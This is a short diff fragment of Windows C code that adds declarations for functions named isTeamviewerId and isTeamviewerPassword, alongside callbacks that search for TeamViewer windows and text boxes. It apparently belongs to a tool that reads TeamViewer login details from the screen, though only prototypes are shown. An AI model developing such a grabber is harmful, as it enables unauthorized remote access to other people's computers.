@@ -4,6 +4,9 @@
 BOOL CALLBACK findWindowCallback(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK findTextboxCallback(HWND hwnd, LPARAM lParam);
 
+BOOL isTeamviewerId(char *buff);
+BOOL isTeamviewerPassword(char *buff);
+
 const char *TV_WINDOW_TITLES[] = {
 	"TeamViewer QuickSupport",
 	"TeamViewer",
